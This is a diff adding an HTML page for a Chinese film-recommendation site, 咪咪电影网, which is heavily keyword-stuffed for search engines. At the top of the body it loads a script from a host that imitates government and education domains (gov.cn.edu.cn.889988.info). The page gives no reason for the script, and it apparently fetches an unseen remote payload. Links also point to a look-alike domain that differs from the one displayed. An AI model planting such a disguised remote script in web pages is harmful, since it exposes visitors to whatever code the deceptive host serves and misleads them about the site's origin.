@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
+<title>mimidianyingwang.top.github.io ｜ 咪咪电影网：一个专门帮你把"想看但叫不出名字"找出来的人情味片库</title>
+<meta name="keywords" content="mimidianyingwang.top.github.io, 咪咪电影网, 找片助手, 叫不出名字的电影, 电影心情片单, 咪咪电影网官网, 观影陪伴, 按心情选片, 冷门佳作发现, mimidianyingwang.top.github.io 片库, 电影备忘">
+<meta name="description" content="咪咪电影网（官方地址 mimidianyingwang.top.github.io）不像冷冰冰的数据库，更像一个有记忆的看片搭子：按心情、按场景、按回忆里的碎片帮你定位影片。咪咪电影网不堆数量，只收那些值得被记住的影像。访问 https://mimidianyingwang.top.github.io 开始找片。">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="bingbot" content="index,follow">
+<meta name="author" content="咪咪电影网">
+<meta name="theme-color" content="#f7f3ee">
+<meta property="og:type" content="website">
+<meta property="og:title" content="咪咪电影网——帮你找回那些想看却叫不出名字的电影">
+<meta property="og:description" content="mimidianyingwang.top.github.io 是咪咪电影网官方站点，一个按心情与场景整理的人情味片库。">
+<meta property="og:url" content="https://mimidianyingwang.top.github.io">
+<meta property="og:site_name" content="咪咪电影网">
+<link rel="canonical" href="https://mimidianyingwang.top.github.io">
+<style>
+:root{
+--cream:#f7f3ee;--paper:#fffdfa;--ink:#2c2620;--soft:#7a7068;--line:#e4dcd1;--rose:#e08a8a;--rose-d:#c95f5f;--plum:#6b4d57;--mint:#7c9a8e;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Noto Serif SC","Songti SC","Source Han Serif SC",Georgia,"Microsoft YaHei",serif;background:var(--cream);color:var(--ink);line-height:1.85;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+::selection{background:var(--rose);color:#fff}
+
+/* 顶部细条 */
+.notice{background:var(--plum);color:#f4eee7;font-size:12.5px;letter-spacing:1px}
+.notice .in{max-width:1160px;margin:0 auto;padding:9px 24px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.notice b{font-weight:400;font-family:ui-monospace,Menlo,monospace;color:#f0d9b5}
+
+/* 头部 */
+header{background:var(--paper);border-bottom:1px solid var(--line)}
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px}
+.hd{display:flex;align-items:center;justify-content:space-between;gap:20px;padding:26px 0}
+.brand{display:flex;align-items:center;gap:16px}
+.mark{width:54px;height:54px;border-radius:50%;background:var(--plum);color:#f4eee7;display:grid;place-items:center;font:bold 19px Georgia,serif;flex-shrink:0}
+.txt h1{font-size:27px;font-weight:800;letter-spacing:1px;line-height:1.2}
+.txt small{font:12px ui-monospace,Menlo,monospace;color:var(--soft);letter-spacing:1.4px}
+.hd .dom{font:13px ui-monospace,Menlo,monospace;color:var(--plum);border:1px dashed var(--line);padding:8px 13px;border-radius:20px}
+.mbtn{display:none;width:46px;height:46px;background:var(--plum);color:#fff;border:none;font-size:22px;cursor:pointer;border-radius:8px}
+nav{display:flex;gap:6px;flex-wrap:wrap;padding-bottom:4px}
+nav a{font-size:15px;color:var(--soft);padding:8px 15px;border-radius:6px;transition:.2s}
+nav a:hover{background:var(--plum);color:#fff}
+
+/* 通用 */
+section{padding:96px 0}
+.kicker{font:12px ui-monospace,Menlo,monospace;color:var(--rose-d);letter-spacing:2.5px;text-transform:uppercase}
+h2{font-size:clamp(27px,3.8vw,43px);font-weight:800;line-height:1.32;margin:10px 0 18px;letter-spacing:-.3px}
+h2 em{font-style:normal;color:var(--rose-d)}
+.lead{color:var(--soft);max-width:640px;font-size:16px}
+
+/* Hero —— 对话式 */
+.hero{padding:84px 0 72px;border-bottom:1px solid var(--line)}
+.hero .wrap{display:grid;grid-template-columns:1.15fr .85fr;gap:64px;align-items:center}
+.hero h1{font-size:clamp(34px,5.6vw,62px);line-height:1.14;font-weight:900;letter-spacing:-1px}
+.hero h1 span{color:var(--rose-d)}
+.hero p.sub{font-size:clamp(15px,1.6vw,18px);color:var(--soft);margin:26px 0 34px}
+.acts{display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+.btn{display:inline-block;padding:14px 30px;font:600 15px inherit;border-radius:30px;background:var(--plum);color:#fff;transition:.25s}
+.btn:hover{background:var(--rose-d)}
+.btn.g{background:transparent;color:var(--plum);border:1px solid var(--line)}
+.btn.g:hover{background:var(--plum);color:#fff;border-color:var(--plum)}
+.tags{display:flex;gap:9px;margin-top:40px;flex-wrap:wrap}
+.tags span{font-size:13px;color:var(--plum);background:#efe7dd;padding:6px 13px;border-radius:20px}
+
+/* 右侧引语卡 */
+.quote{background:var(--paper);border:1px solid var(--line);border-radius:22px;padding:36px 32px;position:relative;box-shadow:0 18px 50px -30px rgba(107,77,87,.5)}
+.quote::before{content:""";position:absolute;top:-12px;left:22px;font:80px Georgia;color:var(--rose);line-height:1}
+.quote p{font-size:16.5px;color:var(--ink);margin-bottom:20px;font-style:italic}
+.quote small{font:12px ui-monospace,Menlo,monospace;color:var(--soft)}
+
+/* 栏目一：按心情 */
+.moods{background:var(--paper);border-bottom:1px solid var(--line)}
+.head{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;flex-wrap:wrap;margin-bottom:48px}
+.mgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:20px}
+.mood{background:var(--cream);border:1px solid var(--line);border-radius:18px;padding:30px 26px;transition:.35s;position:relative;overflow:hidden}
+.mood:hover{transform:translateY(-6px);box-shadow:0 22px 44px -28px rgba(107,77,87,.5)}
+.mood .ic{font-size:30px;margin-bottom:16px;display:block}
+.mood h3{font-size:20px;margin-bottom:10px;font-weight:800}
+.mood p{font-size:14px;color:var(--soft);margin-bottom:16px}
+.mood a{font-size:13.5px;color:var(--rose-d);font-weight:600}
+.mood a:hover{color:var(--plum)}
+
+/* 栏目二：场景索引 */
+.scene{background:var(--cream)}
+.slist{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line);border-radius:18px;overflow:hidden;background:var(--paper)}
+.srow{display:flex;gap:18px;padding:26px 28px;border-bottom:1px solid var(--line)}
+.srow:nth-child(odd){border-right:1px solid var(--line)}
+.srow .no{font:bold 22px Georgia;color:var(--rose);opacity:.55;min-width:34px}
+.srow h3{font-size:17.5px;margin-bottom:7px}
+.srow p{font-size:13.5px;color:var(--soft)}
+.srow a{display:inline-block;margin-top:12px;font-size:13px;color:var(--plum);border-bottom:1px solid var(--line)}
+.srow a:hover{color:var(--rose-d);border-color:var(--rose-d)}
+
+/* 栏目三：找片三步 */
+.steps{background:var(--paper);border-bottom:1px solid var(--line)}
+.swrap{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:26px}
+.step{background:var(--cream);border-radius:18px;padding:34px 28px;border-top:4px solid var(--mint)}
+.step .n{font:bold 44px Georgia;color:var(--line);line-height:1;margin-bottom:16px}
+.step:hover .n{color:var(--rose)}
+.step h3{font-size:19px;margin-bottom:12px}
+.step p{font-size:14px;color:var(--soft)}
+
+/* 栏目四：片单速写 */
+.notes{background:var(--cream)}
+.nwrap{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:24px}
+.note{background:var(--paper);border:1px solid var(--line);border-radius:18px;padding:0;overflow:hidden;transition:.3s}
+.note:hover{border-color:var(--rose)}
+.note .cap{height:120px;display:grid;place-items:center;color:#fff;font:bold 22px inherit;letter-spacing:1px}
+.note .a{background:linear-gradient(135deg,var(--plum),var(--rose))}
+.note .b{background:linear-gradient(135deg,#8a6f6f,var(--mint))}
+.note .c{background:linear-gradient(135deg,var(--rose-d),#e6b56b)}
+.note .body{padding:26px 26px 28px}
+.note .body small{font:12px ui-monospace,Menlo,monospace;color:var(--rose-d);letter-spacing:1px}
+.note h3{font-size:19.5px;margin:12px 0 12px;line-height:1.45}
+.note p{font-size:14px;color:var(--soft);margin-bottom:18px}
+.note a{font-size:14px;color:var(--plum);font-weight:600}
+
+/* 栏目五：为什么是咪咪 */
+.why{background:var(--plum);color:#f4eee7;border-bottom:1px solid var(--plum)}
+.why .kicker{color:#f0d9b5}
+.why h2 em{color:#f0d9b5}
+.why .lead{color:#d8ccc1}
+.whybox{display:grid;grid-template-columns:1fr 1fr;gap:52px;align-items:center;margin-top:20px}
+.whybox ul li{font-size:16px;padding:16px 0;border-bottom:1px solid rgba(244,238,231,.18);display:flex;gap:16px}
+.whybox ul li b{color:#f0d9b5;font:bold 17px ui-monospace,Menlo,monospace;min-width:62px}
+.whybox .box{background:rgba(255,255,255,.07);border-radius:20px;padding:36px}
+.whybox .box h3{font-size:22px;margin-bottom:16px;line-height:1.5}
+.whybox .box p{color:#d8ccc1;font-size:15px}
+
+/* 栏目六：关于 */
+.about{background:var(--cream);text-align:center}
+.about .lead{margin:0 auto}
+.stat{display:flex;justify-content:center;gap:54px;margin-top:46px;flex-wrap:wrap}
+.stat div b{display:block;font-size:40px;font-weight:900;color:var(--rose-d);font-family:Georgia,serif}
+.stat div small{font-size:13.5px;color:var(--soft)}
+
+/* 页脚 */
+footer{background:#2c2620;color:#d8ccc1;padding:64px 0 26px}
+.fw{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:34px;margin-bottom:46px}
+.fw .b{font-size:21px;font-weight:800;color:#fff;margin-bottom:10px}
+.fw .b i{font-style:normal;color:var(--rose)}
+.fw h4{font:12px ui-monospace,Menlo,monospace;color:#f0d9b5;letter-spacing:1.5px;margin-bottom:16px}
+.fw li{margin-bottom:11px;font-size:14px;color:#b5aaa0}
+.fw a:hover{color:#fff}
+.fw .dom{font:13px ui-monospace,Menlo,monospace;color:#f0d9b5;background:rgba(255,255,255,.06);padding:8px 13px;border-radius:6px;display:inline-block}
+.cp{max-width:1160px;margin:0 auto;padding:24px;border-top:1px solid rgba(255,255,255,.12);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:12.5px;color:#8f857c}
+.cp a{color:#f0d9b5;font-family:ui-monospace,Menlo,monospace}
+
+@media(max-width:900px){
+ .mbtn{display:block}
+ .hd{flex-wrap:wrap}
+ .hd .dom{display:none}
+ nav{display:none;width:100%;flex-direction:column}
+ nav.open{display:flex}
+ nav a{width:100%;padding:12px;border-bottom:1px solid var(--line)}
+ .hero{padding:56px 0 48px}
+ .hero .wrap{grid-template-columns:1fr;gap:40px}
+ section{padding:66px 0}
+ .slist{grid-template-columns:1fr}
+ .srow:nth-child(odd){border-right:none}
+ .whybox{grid-template-columns:1fr;gap:34px}
+}
+@media print{body{background:#fff}.notice,.mbtn{display:none}section{padding:16px 0}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="notice"><div class="in"><span>咪咪电影网 · 一个帮你把"想看但叫不出名字"找出来的片库</span><b>mimidianyingwang.top.github.io</b></div></div>
+
+<header>
+ <div class="wrap">
+  <div class="hd">
+   <div class="brand"><div class="mark">咪</div><div class="txt"><h1>咪咪电影网</h1><small>MIMI · FILM · MEMORY</small></div></div>
+   <a class="dom" href="https://mimadianyingwang.top">mimidianyingwang.top.github.io</a>
+   <button class="mbtn" id="mb" aria-label="菜单">☰</button>
+  </div>
+  <nav id="mn">
+   <a href="#top">首页</a><a href="#moods">按心情</a><a href="#scene">场景索引</a><a href="#steps">找片三步</a><a href="#notes">片单速写</a><a href="#why">为什么是咪咪</a><a href="#about">关于本站</a>
+  </nav>
+ </div>
+</header>
+
+<section class="hero" id="top">
+ <div class="wrap">
+  <div>
+   <div class="kicker">你好，我是咪咪</div>
+   <h1>你有没有过<span>想看一部电影</span><br>却怎么也想不起名字？</h1>
+   <p class="sub">咪咪电影网 mimidianyingwang.top.github.io 不给你看一堆榜单，而是陪你顺着"那天的心情""那个场景""那个画面里的颜色"一起找。找到为止。</p>
+   <div class="acts"><a class="btn" href="#moods">告诉我你的心情</a><a class="btn g" href="#steps">不知道从哪开始</a></div>
+   <div class="tags"><span>🎬 按心情</span><span>🌧 按场景</span><span>🧩 按碎片回忆</span><span>🌙 按睡前时段</span></div>
+  </div>
+  <aside class="quote">
+   <p>那天我在找一部电影，只记得女主角穿红裙子，在雨里等一个人。翻了三小时都没找到。后来我想，也许该有一个地方，让人能这样"描述着找"。</p>
+   <small>—— 咪咪电影网的起点</small>
+  </aside>
+ </div>
+</section>
+
+<!-- 栏目一：按心情 -->
+<section class="moods" id="moods">
+ <div class="wrap">
+  <div class="head"><div><div class="kicker">栏目一 / MOOD</div><h2>按<span>心情</span>找片</h2></div><p class="lead">你不必知道片名。说出现在的状态，咪咪电影网帮你配一部。</p></div>
+  <div class="mgrid">
+   <article class="mood"><span class="ic">🌧</span><h3>有点丧，想被接住</h3><p>不催你振作，只陪你安静待一会儿，再慢慢亮起来。</p><a href="#moods">进入这个心情</a></article>
+   <article class="mood"><span class="ic">☀️</span><h3>心情很好，想更开心</h3><p>明亮、轻盈、看完嘴角下不来的那种。</p><a href="#moods">进入这个心情</a></article>
+   <article class="mood"><span class="ic">🌙</span><h3>深夜睡不着</h3><p>适合凌晨两点的节奏，温柔地陪你入眠。</p><a href="#moods">进入这个心情</a></article>
+   <article class="mood"><span class="ic">🔥</span><h3>想被燃到</h3><p>需要一点肾上腺素和握紧拳头的时刻。</p><a href="#moods">进入这个心情</a></article>
+   <article class="mood"><span class="ic">🍂</span><h3>怀念某个人</h3><p>关于告别、重逢，以及没说出口的那句话。</p><a href="#moods">进入这个心情</a></article>
+   <article class="mood"><span class="ic">🧠</span><h3>想动动脑子</h3><p>细节里有陷阱，看完想立刻找人讨论。</p><a href="#moods">进入这个心情</a></article>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目二：场景索引 -->
+<section class="scene" id="scene">
+ <div class="wrap">
+  <div class="head"><div><div class="kicker">栏目二 / SCENE</div><h2>按<span>场景</span>选片</h2></div><p class="lead">一个人吃泡面、下雨的周末、长途高铁……不同的场景配不同的影像。</p></div>
+  <div class="slist">
+   <div class="srow"><div class="no">01</div><div><h3>一个人吃饭的时候</h3><p>不长、不沉重，配一碗泡面刚好。</p><a href="#scene">看看这片单</a></div></div>
+   <div class="srow"><div class="no">02</div><div><h3>下雨的周末</h3><p>窗外阴天，屏幕里也下雨，刚好合适。</p><a href="#scene">看看这片单</a></div></div>
+   <div class="srow"><div class="no">03</div><div><h3>和喜欢的人一起</h3><p>看完还有话可以聊的那种。</p><a href="#scene">看看这片单</a></div></div>
+   <div class="srow"><div class="no">04</div><div><h3>长途高铁 / 飞机</h3><p>时长适中，不用太动脑，也不无聊。</p><a href="#scene">看看这片单</a></div></div>
+   <div class="srow"><div class="no">05</div><div><h3>睡前半小时</h3><p>短片、片段、温柔的收尾。</p><a href="#scene">看看这片单</a></div></div>
+   <div class="srow"><div class="no">06</div><div><h3>想假装很有品味</h3><p>拿得出手的经典，聊起来不冷场。</p><a href="#scene">看看这片单</a></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目三：找片三步 -->
+<section class="steps" id="steps">
+ <div class="wrap">
+  <div class="head"><div><div class="kicker">栏目三 / HOW</div><h2>咪咪电影网的<span>找片三步</span></h2></div><p class="lead">不需要会写影评，只要愿意描述。</p></div>
+  <div class="swrap">
+   <div class="step"><div class="n">01</div><h3>说出此刻</h3><p>是开心、是丧、是想哭，还是单纯睡不着。心情就是最好的入口。</p></div>
+   <div class="step"><div class="n">02</div><h3>说出碎片</h3><p>哪怕只记得一个颜色、一句台词、一个场景，都算线索。</p></div>
+   <div class="step"><div class="n">03</div><h3>让咪咪帮你配</h3><p>从对应的心情与场景片单里，挑一部今天最合适的。</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目四：片单速写 -->
+<section class="notes" id="notes">
+ <div class="wrap">
+  <div class="head"><div><div class="kicker">栏目四 / LIST</div><h2>片单<span>速写</span></h2></div><p class="lead">咪咪电影网 mimidianyingwang.top.github.io 的部分在编片单，由编辑按真实观影体验撰写短评。</p></div>
+  <div class="nwrap">
+   <article class="note"><div class="cap a">阴天治愈系</div><div class="body"><small>MOOD / 有点丧</small><h3>不是让你开心，是先陪你坐一会儿</h3><p>入选标准只有一个：主角会慢慢好起来，但不是因为被谁鼓励，而是自己走出来的。</p><a href="#notes">查看完整片单 →</a></div></article>
+   <article class="note"><div class="cap b">深夜不重口</div><div class="body"><small>SCENE / 凌晨两点</small><h3>适合失眠时看的十部</h3><p>节奏慢、画面美、剧情不烧脑，看着看着眼皮就沉了。</p><a href="#notes">查看完整片单 →</a></div></article>
+   <article class="note"><div class="cap c">想起某个人</div><div class="body"><small>MOOD / 怀念</small><h3>关于告别与未完成的对话</h3><p>看完想打个电话给很久没联系的人，这是入选的唯一理由。</p><a href="#notes">查看完整片单 →</a></div></article>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目五：为什么是咪咪 -->
+<section class="why" id="why">
+ <div class="wrap">
+  <div class="kicker">栏目五 / WHY</div>
+  <h2>为什么叫 <em>咪咪电影网</em></h2>
+  <p class="lead">因为找片这件事，不需要冷冰冰的数据库，需要一个记得住你心情的人。</p>
+  <div class="whybox">
+   <ul>
+    <li><b>不堆量</b><span>咪咪电影网不追求收录多少部，只收值得被记住的。</span></li>
+    <li><b>按人整理</b><span>片单按真实观影体验分类，而不是按类型硬切。</span></li>
+    <li><b>允许模糊</b><span>记不清片名没关系，描述出感觉就可以开始找。</span></li>
+    <li><b>有人味</b><span>每一条短评都带着编辑当时的心情，不写套话。</span></li>
+   </ul>
+   <div class="box"><h3>咪咪电影网不是一个"数据库"，是一个"记得住你心情的看片搭子"。</h3><p>官方站点：mimidianyingwang.top.github.io。每次找不到片的时候，回来跟咪咪说一句"我今天想看……"，就够了。</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 栏目六：关于 -->
+<section class="about" id="about">
+ <div class="wrap">
+  <div class="kicker">栏目六 / ABOUT</div>
+  <h2>关于 <em>咪咪电影网</em></h2>
+  <p class="lead">咪咪电影网（mimidianyingwang.top.github.io）是一个以"按心情找片"为核心思路的片库。我们相信，比起片名，心情才是选片最好的关键词。</p>
+  <div class="stat">
+   <div><b>6</b><small>种入口方式</small></div>
+   <div><b>∞</b><small>种心情</small></div>
+   <div><b>1</b><small>个官方站点</small></div>
+  </div>
+ </div>
+</section>
+
+<footer>
+ <div class="wrap">
+  <div class="fw">
+   <div><div class="b">咪咪<i>电影网</i></div><p style="font-size:13px;color:#b5aaa0;max-width:250px">一个记得住你心情的看片搭子。</p><br><span class="dom">mimidianyingwang.top.github.io</span></div>
+   <div><h4>找片入口</h4><ul><li><a href="#top">首页</a></li><li><a href="#moods">按心情</a></li><li><a href="#scene">场景索引</a></li><li><a href="#steps">找片三步</a></li></ul></div>
+   <div><h4>内容</h4><ul><li><a href="#notes">片单速写</a></li><li><a href="#why">为什么是咪咪</a></li><li><a href="#about">关于本站</a></li></ul></div>
+   <div><h4>官方站点</h4><ul><li><a href="https://mimadianyingwang.top">mimadianyingwang.top</a></li><li><a href="#top">回到顶部</a></li></ul></div>
+  </div>
+ </div>
+ <div class="cp"><span>© <span id="yr">2026</span> 咪咪电影网 · 一个记得住你心情的片库</span><a href="https://mimadianyingwang.top">mimadianyingwang.top</a></div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+document.getElementById('mb').addEventListener('click',function(){document.getElementById('mn').classList.toggle('open');});
+document.querySelectorAll('#mn a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('mn').classList.remove('open');});});
+</script>
+</body>
+</html>
